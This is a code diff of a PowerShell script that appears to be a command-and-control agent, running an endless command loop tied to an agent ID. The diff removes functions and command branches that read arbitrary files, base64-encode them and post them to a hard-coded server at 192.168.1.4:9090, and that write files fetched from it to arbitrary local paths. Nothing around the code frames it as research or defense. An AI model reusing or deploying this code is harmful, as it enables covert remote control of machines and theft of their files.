@@ -30,29 +30,6 @@ function load($module)
 	return $modulecontent
 }
 
-function Download($file)
-{
-	
-	
-	
-	$handle = new-object net.WebClient;
-	$handleh = $handle.Headers;
-	$handleh.add("Content-Type", "application/x-www-form-urlencoded");
-	$modulecontent = $handle.UploadString("http://192.168.1.4:9090/up/$agent", "data="+"$file");
-	return $modulecontent
-}
-
-function upload($file)
-{
-	
-	
-	
-	$handle = new-object net.WebClient;
-	$handleh = $handle.Headers;
-	$handleh.add("Content-Type", "application/x-www-form-urlencoded");
-	$modulecontent = $handle.UploadString("http://192.168.1.4:9090/img/$agent", "data="+"$file");
-	return $modulecontent
-}
 
 
 while ($true)
@@ -86,43 +63,7 @@ while ($true)
 		
 		
 	}
-	elseif ($cmd.split(" ")[0] -eq "download")
-	{
-        try
-		{
-			$file = $cmd.split(" ")[1]
-            echo $file
-		    $path = $cmd.split(" ")[2]
-            echo $path
-            $filedata=Download -file $file
-		    $bytes = [Convert]::FromBase64String($filedata)
-		    [IO.File]::WriteAllBytes($path, $bytes)
-		    $output="download file to $path"
-		}
-		catch
-		{
-			$output = "err download file"
-		}
-		
-	}
-	elseif ($cmd.split(" ")[0] -eq "upload")
-	{
-        try
-		{
-			$path = $cmd.split(" ")[1]
-            #echo $file
-            $filedata=[IO.File]::ReadAllBytes($path)
-            $bytes = [Convert]::ToBase64String($filedata)
-            echo $bytes
-		    $output=upload -file $bytes
-		}
-		catch
-		{
-			$output = "err upload file"
-		}
-		
-	}
-
+	
 	else
 	{
 		
